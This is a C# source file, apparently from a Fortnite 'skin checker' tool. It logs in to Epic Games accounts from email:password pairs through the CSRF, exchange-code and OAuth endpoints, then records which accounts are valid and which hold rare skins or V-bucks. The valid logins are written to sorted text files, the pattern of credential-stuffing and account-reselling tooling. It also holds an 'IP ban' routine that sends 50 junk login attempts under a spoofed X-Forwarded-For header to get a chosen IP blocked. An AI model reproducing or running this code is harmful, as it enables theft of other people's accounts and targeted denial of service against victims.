                        httpRequest.AddHeader("X-Forwarded-For", IpAddressToTab.Text);
                        httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
                        string Ban1 = string.Format("grant_type=password&username={0}&password={1}&includePerms=true&token_type=eg1", "username" + RandomEmail + "@gmail.com", "Password" + RandomEmail);
                        string Ban2 = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", Ban1, "application/x-www-form-urlencoded").ToString();
                        BanTimeText.Text = "Ban Attempt " + BanLoop.ToString() + "/50";
                        BanLoop++;
                    }
                }
                BanTimeText.Text = "Successfully Banned: " + IpAddressToTab.Text;
                BanThereIP.Enabled = true;
                IpAddressToTab.Enabled = true;
            }
            else
            {
                BanTimeText.Text = "Invalid IP Address Given, Try Aagain!";
                BanThereIP.Enabled = true;
                IpAddressToTab.Enabled = true;
            }
        }

        private void nsButton16_Click(object sender, EventArgs e)
        {
            Thread BanningIPTime = new Thread(BanIpAddress);
            CheckForIllegalCrossThreadCalls = false;
            BanningIPTime.Start();
        }

        private void EnableIPBan_CheckedChanged(object sender)
        {

        }

        private void bunifuCircleProgressbar1_Click(object sender, EventArgs e)
        {
            FnBattleRoyalLB.Items.Clear();
        }
        [VirtualizeCode]
        private void SingleAccountCheck()
        {
            LoadSkins();
            LoadBackBlings();
            LoadPickAxes();
            LoadGliders();
            LoadDances();
            LoadEmojis();
            if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            }
            textfile = Path.Combine(folder, string.Format("Skins Checked By TCM's Skin Checker.txt", fileName));
            validaccounts = Path.Combine(folder, string.Format("Valid Accounts Checked By TCM's Skin Checker.txt", fileName));
            badaccounts = Path.Combine(folder, string.Format("Bad Checked By TCM's Skin Checker.txt", fileName));
            TWOFAaccounts = Path.Combine(folder, string.Format("TwoStep Accounts Checked By TCM's Skin Checker.txt", fileName));
            BlackKnight = Path.Combine(folder, string.Format("Black Knight Accounts Checked By TCM's Skin Checker.txt", fileName));
            CodenameELF = Path.Combine(folder, string.Format("odename ELF Accounts Checked By TCM's Skin Checker.txt", fileName));
            Crackshot = Path.Combine(folder, string.Format("Crackshot Accounts Checked By TCM's Skin Checker.txt", fileName));
            GhoulTrooper = Path.Combine(folder, string.Format("Ghoul Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            MerryMarauder = Path.Combine(folder, string.Format("Merry Marauder Accounts Checked By TCM's Skin Checker.txt", fileName));
            NogOps = Path.Combine(folder, string.Format("Nog Ops Accounts Checked By TCM's Skin Checker.txt", fileName));
            RedNosedRaider = Path.Combine(folder, string.Format("Red Nosed Raider Accounts Checked By TCM's Skin Checker.txt", fileName));
            OGSkullTrooper = Path.Combine(folder, string.Format("OG Skull Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            NoneOGSkullTrooper = Path.Combine(folder, string.Format("None OG Skull Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            Scythe = Path.Combine(folder, string.Format("Scythe Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveTheWorld = Path.Combine(folder, string.Format("Save The World Accounts Checked By TCM's Skin Checker.txt", fileName));
            Savevbucks = Path.Combine(folder, string.Format("Vbucks Accounts Checked By TCM's Skin Checker.txt", fileName));
            SavePCPlatform = Path.Combine(folder, string.Format("PC Accounts Checked By TCM's Skin Checker.txt", fileName));
            SavePS4Platform = Path.Combine(folder, string.Format("PS4 Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveXboxPlatform = Path.Combine(folder, string.Format("Xbox Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveNintendoPlatform = Path.Combine(folder, string.Format("Nintendo Accounts Checked By TCM's Skin Checker.txt", fileName));
            StackedAccounts = Path.Combine(folder, string.Format("Stacked Accounts Found By TCM's Skin Checker.txt", fileName));
            Royalebomber = Path.Combine(folder, string.Format("Royalebomber Found By TCM's Skin Checker.txt", fileName));
            Candyaxe = Path.Combine(folder, string.Format("Candyaxe Found By TCM's Skin Checker.txt", fileName));
            RenegadeSkin = Path.Combine(folder, string.Format("Renegade Found By TCM's Skin Checker.txt", fileName));
            AerialAssaultTrooper = Path.Combine(folder, string.Format("Aerial Assault Trooper Found By TCM's Skin Checker.txt", fileName));
            Raidersrevenge = Path.Combine(folder, string.Format("Raiders Revenge Found By TCM's Skin Checker.txt", fileName));
            PowerChord = Path.Combine(folder, string.Format("Power Chord Found By TCM's Skin Checker.txt", fileName));
            SgtGreenClover = Path.Combine(folder, string.Format("SGT. Green Clover Found By TCM's Skin Checker.txt", fileName));
            GGSave = Path.Combine(folder, string.Format("Ginger Gunner Found By TCM's Skin Checker.txt", fileName));

            STWStandard = Path.Combine(folder, string.Format("STW Standard Edition Found By TCM's Skin Checker.txt", fileName));
            STWDelux = Path.Combine(folder, string.Format("STW Delux Edition Found By TCM's Skin Checker.txt", fileName));
            STWSDelux = Path.Combine(folder, string.Format("STW Super Delux Edition Found By TCM's Skin Checker.txt", fileName));
            STWLimited = Path.Combine(folder, string.Format("STW Limited Edition Found By TCM's Skin Checker.txt", fileName));
            STWUltimate = Path.Combine(folder, string.Format("STW Ultimate Edition Found By TCM's Skin Checker.txt", fileName));


            GalaxySkinFound = Path.Combine(folder, string.Format("Galaxy Skins Found By TCM's Skin Checker.txt", fileName));
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.ClearAllHeaders();
                httpRequest.KeepAlive = false;
                httpRequest.Cookies = new CookieDictionary(false);
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
                string response = httpRequest.Get("https://www.epicgames.com/id/api/csrf").ToString();
                MessageBox.Show(response);
                var value = httpRequest.Cookies["XSRF-TOKEN"];
                httpRequest.AddHeader("x-xsrf-token", value);
                string SingleAccountInfo = string.Format("email={0}&password={1}&rememberMe=False", SingleAccountEmail.Text, SingleAccontPassword.Text);
                string SingleAccountOath = httpRequest.Post("https://www.epicgames.com/id/api/login", SingleAccountInfo, "application/x-www-form-urlencoded").ToString();
                httpRequest.AddHeader("x-xsrf-token", value);
                string GetOath1 = httpRequest.Get("https://www.epicgames.com/id/api/redirect").ToString();
                httpRequest.AddHeader("x-xsrf-token", value);
                string GetOath2 = httpRequest.Get("https://www.epicgames.com/id/api/exchange").ToString();
                JToken AccessToken = JObject.Parse(GetOath2)["code"];
                httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
                string OathThisShit = string.Format("grant_type=exchange_code&exchange_code=" + AccessToken + "&token_type=eg1");
                string SingleAccountOathFinal = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", OathThisShit, "application/x-www-form-urlencoded").ToString();
                if (SingleAccountOathFinal.Contains("access_token"))
                {
                    string SingleAccountString1 = Regex.Match(SingleAccountOathFinal, "\"access_token\" : \"(.*?)\",").Groups[1].Value;
                    string SingleAccountString2 = Regex.Match(SingleAccountOathFinal, "\"account_id\" : \"(.*?)\"").Groups[1].Value;
                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", SingleAccountString1));
                    string characters = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=athena&rvn=-1", SingleAccountString2), "{}", "application/json").ToString();
                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", SingleAccountString1));
                    string ExtraInfo = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=common_core&rvn=-1", SingleAccountString2), "{}", "application/json").ToString();
                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", SingleAccountString1));
                    string AccountDetails = httpRequest.Get(string.Format("https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/" + SingleAccountString2)).ToString();
                    if (characters.Contains("profile"))
                    {
                        index = 0;
                        validcnt = 0;
                        invalidcnt = 0;
                        errorcnt = 0;
                        checkedcnt = 0;
                        retrycnt = 0;
                        rareskins = 0;
                        STW = 0;
                        Skully = 0;
                        RenegadeCount = 0;
                        VbucksFound = 0;
                        TotalSkinsChecked = 0;
                        TotalGlidersChecked = 0;
                        StandardSTW = 0;
                        OGSkullCount = 0;
                        NoobySkullTrooperAccounts = 0;
                        DeluxEditionSTW = 0;
                        SuperDeluxSTW = 0;
                        LimitedEditionSTWE = 0;
                        UltimateEditionSTWE = 0;
                        TotalGalaxyChecked = 0;
                        lockedCuz2Fa = 0;
                        FnBattleRoyalLB.Items.Clear();
                        SaveDataNEW(SingleAccountEmail.Text + ":" + SingleAccontPassword.Text, characters, ExtraInfo, AccountDetails);
                        updatestatus();
                    }
                    else
                    {
                        
                        MessageBox.Show("Account seems to be bad, Give it another go!");
                    }
                }
                else
                {
                    MessageBox.Show("Account seems to be bad, Give it another go!");
                }
            }
        }
        private void SaveDataNEW(string account, string characters, string ExtraInfo, string AccountDetails)
        {
            if (ListBoxDisableText.Checked == false)
            {
                FnBattleRoyalLB.BeginUpdate();
            }
            if (ListBoxDisableText.Checked)
            {
                FnBattleRoyalLB.Items.Clear();
            }
            base.Invoke(new MethodInvoker(delegate
            {
                using (StreamWriter sw = File.AppendText(textfile))
                {
                    string x = characters;
                    string c = ExtraInfo;
                    string a = AccountDetails;
                    var data = JsonConvert.DeserializeObject<FortniteProfileData>(x);

                    var accountId = data.ProfileChanges[0].Profile.AccountId;
                    var profileID = data.ProfileChanges[0].Profile.Id;

                    var items = data.ProfileChanges[0].Profile.Item;

                    var outfits = SkinParser.GetOutfit(items);
                    var backblings = SkinParser.GetBackBlings(items);
                    var gliders = SkinParser.GetGliders(items);
                    var pickaxes = SkinParser.GetPickaxes(items);
                    var Dances = SkinParser.GetDances(items);
                    var Emojis = SkinParser.GetEmojis(items);
                    var LoadingScreens = SkinParser.GetLoadingScreens(items);

                    var userProfileData = data.ProfileChanges[0].Profile;

                    var createdAt = userProfileData.Created;
                    var lastUpdated = userProfileData.Updated;
                    var hasBattlePass = userProfileData.Stats.Attributes.BookPurchased;
                    var currentPassTier = userProfileData.Stats.Attributes.BookLevel;
                    var lifetimeWins = userProfileData.Stats.Attributes.LifetimeWins;
                    var currentLevel = userProfileData.Stats.Attributes.Level;
                    var accountLevel = userProfileData.Stats.Attributes.AccountLevel;
                    if (IsUsingTradingSystem == false)
                    {
                        ShowNotification("Valid Account Found!", account + " Is Valid!");
                        sw.WriteLine("--------------------------------------------------------");
                        if (ListBoxDisableText.Checked == false)
                        {
                            FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                        }
                        sw.WriteLine("-------------------<EpicAccount>------------------------");
                        if (ListBoxDisableText.Checked == false)
                        {
                            FnBattleRoyalLB.Items.Add("-------------------<EpicAccount>------------------------");
                        }
                        sw.WriteLine("- Login: " + account);
                        if (ListBoxDisableText.Checked == false)
                        {
                            FnBattleRoyalLB.Items.Add("- Login: " + account);
                        }
                        int TotalSkins = 0;
                        if (CheckForSkins.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                FnBattleRoyalLB.Items.Add("----------------------<Skins>---------------------------");
                            }
                            sw.WriteLine("----------------------<Skins>---------------------------");
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool noSkin = !x.Contains("AthenaCharacter");
                            if (noSkin)
                            {
                                sw.WriteLine("=> No Skin But Account Valid");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> No Skin But Account Valid");
                                }
                                Interlocked.Increment(ref TotalSkins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                            }
                            else
                            {
                                using (StringReader sr = new StringReader(outfits))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref TotalSkins);
                                        Interlocked.Increment(ref TotalSkinsChecked);
                                    }
                                }                   
                            }
                            int backblingfound = 0;
                            if (CheckForBackBling.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Back Bling>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Back Bling>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                using (StringReader sr = new StringReader(backblings))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref backblingfound);
                                    }
                                }
                            }
                            int AxesFound = 0;
                            if (CheckForAxes.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Pickaxes>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Pickaxes>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                using (StringReader sr = new StringReader(pickaxes))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref TotalGlidersChecked);
                                        Interlocked.Increment(ref AxesFound);
                                    }
                                }
                            }
                            int TotalGliders = 0;
                            if (CheckForGliders.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Gliders>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Gliders>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                using (StringReader sr = new StringReader(gliders))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref TotalGliders);
                                    }
                                }
                            }
                            int TotalDances = 0;
                            if (CheckForDances.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Dances>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Dances>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                using (StringReader sr = new StringReader(Dances))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref TotalDances);
                                    }
                                }
                            }
                            int TotalEmojis = 0;
                            if (CheckForEmojis.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Emoji's>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Emoji's>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                using (StringReader sr = new StringReader(Emojis))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref TotalEmojis);
                                    }
                                }
                            }
                            int TotalLoadingScreens = 0;
                            if (CheckForLoadingScreens.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Loading Screens>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Loading Screens>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                using (StringReader sr = new StringReader(LoadingScreens))
                                {
                                    string line;
                                    while ((line = sr.ReadLine()) != null)
                                    {
                                        FnBattleRoyalLB.Items.Add(line);
                                        sw.WriteLine(line);
                                        Interlocked.Increment(ref TotalLoadingScreens);
                                    }
                                }
                            }
                            if (CheckForTotalItemCount.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Total Item Count>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Total Item Count>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("Total Skins -----> " + TotalSkins);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Skins -----> " + TotalSkins);
                                }
                                sw.WriteLine("Total BackBling -----> " + backblingfound);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total BackBling -----> " + backblingfound);
                                }
                                sw.WriteLine("Total Axes -----> " + AxesFound);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Axes -----> " + AxesFound);
                                }
                                sw.WriteLine("Total Gliders -----> " + TotalGliders);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Gliders -----> " + TotalGliders);
                                }
                                sw.WriteLine("Total Dances -----> " + TotalDances);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Dances -----> " + TotalDances);
                                }
                                sw.WriteLine("Total Emoji's -----> " + TotalEmojis);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Emoji's -----> " + TotalEmojis);
                                }
                                sw.WriteLine("Total Loading Screens -----> " + TotalLoadingScreens);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Loading Screens -----> " + TotalLoadingScreens);
                                }
                                int TotalItemsOnAccount = TotalSkins + backblingfound + AxesFound + TotalGliders + TotalDances + TotalEmojis + TotalLoadingScreens;
                                sw.WriteLine("Total Items On Account -----> " + TotalItemsOnAccount);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Total Items On Account -----> " + TotalItemsOnAccount);
                                }
                            }
                        }
                        if (IncrementSaveVbucks.Checked)
                        {
                            try
                            {
                                JToken VbuckItems = JObject.Parse(c)["profileChanges"][0]["profile"]["items"];

                                foreach (JToken VbuckItem in VbuckItems.Children())
                                {
                                    if (VbuckItem.First["templateId"].ToString() == "Currency:MtxGiveaway")
                                    {
                                        string TotalVbucksFound = VbuckItem.First["quantity"].ToString();
                                        int TotalVbucksFoundint = Int32.Parse(TotalVbucksFound);
                                        if (!Directory.Exists(folder + "//Stacked Vbucks//"))
                                        {
                                            Directory.CreateDirectory(folder + "//Stacked Vbucks//");
                                        }
                                        int val = TotalVbucksFoundint;
                                        bool Belowtwohundo = IsWithin(val, 1, 200);
                                        if (Belowtwohundo)
                                        {
                                            BelowtwoSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("0-200 Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter belowTwoHundoWriter = File.AppendText(BelowtwoSaveName))
                                            {
                                                belowTwoHundoWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool TwoToEight = IsWithin(val, 200, 800);
                                        if (TwoToEight)
                                        {
                                            TwoToEightSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("200-800 Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter TwoToEightWriter = File.AppendText(TwoToEightSaveName))
                                            {
                                                TwoToEightWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToOneThousand = IsWithin(val, 801, 1000);
                                        if (ToOneThousand)
                                        {
                                            ToOneThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("1-1,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToOneThousandWriter = File.AppendText(ToOneThousandSaveName))
                                            {
                                                ToOneThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToTwoThousand = IsWithin(val, 1001, 2000);
                                        if (ToTwoThousand)
                                        {
                                            ToTwoThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("1,000-2,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToTwoThousandWriter = File.AppendText(ToTwoThousandSaveName))
                                            {
                                                ToTwoThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToThreeThousand = IsWithin(val, 2001, 3000);
                                        if (ToThreeThousand)
                                        {
                                            ToThreeThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("2,000-3,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToThreeThousandWriter = File.AppendText(ToThreeThousandSaveName))
                                            {
                                                ToThreeThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToFourThousand = IsWithin(val, 3001, 4000);
                                        if (ToFourThousand)
                                        {
                                            ToFourThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToFourThousandWriter = File.AppendText(ToFourThousandSaveName))
                                            {
                                                ToFourThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToFiveThousand = IsWithin(val, 4001, 5000);
                                        if (ToFiveThousand)
                                        {
                                            ToFiveThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToFiveThousandWriter = File.AppendText(ToFiveThousandSaveName))
                                            {
                                                ToFiveThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToSixThousand = IsWithin(val, 5001, 6000);
                                        if (ToSixThousand)
                                        {
                                            ToSixThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToSixThousandWriter = File.AppendText(ToSixThousandSaveName))
                                            {
                                                ToSixThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToSevenThousand = IsWithin(val, 6001, 7000);
                                        if (ToSevenThousand)
                                        {
                                            ToSevenThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToSevenThousandWriter = File.AppendText(ToSevenThousandSaveName))
                                            {
                                                ToSevenThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToEightThousand = IsWithin(val, 7001, 8000);
                                        if (ToEightThousand)
                                        {
                                            ToEightThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToEightThousandWriter = File.AppendText(ToEightThousandSaveName))
                                            {
                                                ToEightThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToNineThousand = IsWithin(val, 8001, 9000);
                                        if (ToNineThousand)
                                        {
                                            ToNineThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToNineThousandWriter = File.AppendText(ToNineThousandSaveName))
                                            {
                                                ToNineThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToTenThousand = IsWithin(val, 9001, 10000);
                                        if (ToTenThousand)
                                        {
                                            ToTenThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToTenThousandWriter = File.AppendText(ToTenThousandSaveName))
                                            {
                                                ToTenThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool AboveTenthousnad = IsWithin(val, 10001, 999999);
                                        if (AboveTenthousnad)
                                        {
                                            AboveTenThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter AboveTenThousandWriter = File.AppendText(AboveTenThousandSaveName))
                                            {
                                                AboveTenThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                    }
                                }
                            }
                            catch
                            {
                                //User has no Vbucks - RIP
                            }
                        }
                        if (CheckForOtherInformation.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Other Useful Information>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Other Useful Information>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            FnBattleRoyalLB.Items.Add("Profile ID:   (" + profileID + ")");
                            FnBattleRoyalLB.Items.Add("Account ID:   (" + accountId + ")");
                            FnBattleRoyalLB.Items.Add("Account Creation Date:  (" + createdAt + ")");
                            FnBattleRoyalLB.Items.Add("Game Last Played:  (" + lastUpdated + ")");
                            FnBattleRoyalLB.Items.Add("LifeTime Wins   (" + lifetimeWins + ")");
                            FnBattleRoyalLB.Items.Add("Season Level   (" + currentLevel + ")");
                            FnBattleRoyalLB.Items.Add("Account Level   (" + accountLevel + ")");
                            FnBattleRoyalLB.Items.Add("Has Current Battlepass: " + hasBattlePass);
                            sw.WriteLine("Profile ID:   (" + profileID + ")"
                                + "\n" + "Account ID:   (" + accountId + ")"
                                + "\n" + "Account Creation Date:  (" + createdAt + ")"
                                + "\n" + "Game Last Played:  (" + lastUpdated + ")"
                                + "\n" + "LifeTime Wins   (" + lifetimeWins + ")"
                                + "\n" + "Season Level   (" + currentLevel + ")"
                                + "\n" + "Account Level   (" + accountLevel + ")"
                                + "\n" + "Has Current Battlepass: " + hasBattlePass);

                            var HasPas = hasBattlePass.ToString();
                            if (HasPas == "True")
                            {
                                FnBattleRoyalLB.Items.Add("Current Battlepass Level: " + currentPassTier);
                                sw.WriteLine("Current Battlepass Level: " + currentPassTier);
                            }
                        }
                    }
                    FnBattleRoyalLB.EndUpdate();
                }
            }));        
        }



        public string DecryptString(string encrString)
        {
            byte[] b;
            string decrypted;
            try
            {
                b = Convert.FromBase64String(encrString);
                decrypted = System.Text.ASCIIEncoding.ASCII.GetString(b);
            }
            catch (FormatException)
            {
                decrypted = "";
            }
            return decrypted;
        }

        //LOAD ALL SKINS!
        private void LoadSkins()
        {
            {
                string phraseEncrypted = new WebClient().DownloadString("https://pastebin.com/raw/htdvSadq");
                string phrase = DecryptString(phraseEncrypted);
                Console.WriteLine(phrase);
                using (var reader = new StringReader(phrase))
                {
                    for (string line = reader.ReadLine(); line != null; line = reader.ReadLine())
                    {
                        string phrase2 = line;
                        string[] words2 = phrase2.Split(',');
                        try
                        {
                            GlobalVariables.Outfits.Add(words2[0].ToLower(), words2[1]);
                        }
                        catch { }
                    }
                }
            }
        }

        private void LoadBackBlings()
        {
            string phraseEncrypted = new WebClient().DownloadString("https://pastebin.com/raw/d7YqmKvq");
            string phrase = DecryptString(phraseEncrypted);
            Console.WriteLine(phrase);
            using (var reader = new StringReader(phrase))
            {
                for (string line = reader.ReadLine(); line != null; line = reader.ReadLine())
                {
                    string phrase2 = line;
